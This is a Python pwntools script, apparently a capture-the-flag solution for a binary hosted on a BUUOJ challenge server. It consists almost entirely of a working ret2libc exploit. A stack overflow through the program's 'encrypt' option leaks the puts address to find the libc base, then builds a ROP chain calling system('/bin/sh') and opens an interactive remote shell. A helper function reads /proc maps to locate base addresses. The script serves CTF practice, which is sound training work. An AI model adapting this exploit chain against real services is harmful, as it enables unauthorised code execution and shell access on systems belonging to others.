#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
success = lambda name, value: log.success('{} -> {:#x}'.format(name, value))
def debug():
    binaryname = 'pwn'
    interruptPoint=[]
    pid = int(os.popen('pgrep {}'.format(binaryname)).readlines()[0])
    maps = os.popen('cat /proc/{}/maps'.format(pid))
    ELFbase = 0
    libcBase = 0
    for inf in maps.readlines():
        if ELFbase == 0:
            if binaryname in inf:
                ELFbase = int(inf.split('-', 1)[0], 16)
        if libcBase == 0:
            if 'libc' in inf:
                libcBase = int(inf.split('-', 1)[0], 16)
    success('pid', pid)
    success('elfbase', ELFbase)
    if len(interruptPoint) :
        for p in interruptPoint:
            success('interruptPoint', hex(p+ELFbase))
    success('libcBase', libcBase)
    raw_input('debug>')

local = 0
if local:
    io = process('./pwn')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    io = remote('node2.buuoj.cn.wetolink.com',28590)
    libc = ELF('../libc-2.27-x64.so')
elf = ELF('./pwn')
prdi = 0x0000000000400c83
prsir15=0x0000000000400c81

def enc(text):
    io.sendlineafter('choice!\n', '1')
    io.sendlineafter('encrypted\n', text)

if __name__ == '__main__':
    padding = '\x00' * 0x50 + 'deadbeef'
    payload = padding + p64(prdi) + p64(elf.got['puts'])
    payload += p64(elf.plt['puts']) + p64(elf.sym['_start'])
    enc(payload)
    io.recvuntil('\n\n')
    puts_addr = u64(io.recvuntil('\n', drop = True).ljust(8, '\x00'))
    libcbase = puts_addr - libc.sym['puts']
    success('libcbase', libcbase)
    libc.address = libcbase
    sys = libc.sym['system']
    binsh = libc.search('/bin/sh').next()
    success('sysem', sys)
    success('binsh', binsh)
    payload = padding + p64(prdi) + p64(binsh)
    payload += p64(sys) + p64(0xdeadbeef) # trick
    enc(payload)
    io.interactive()
    io.close()
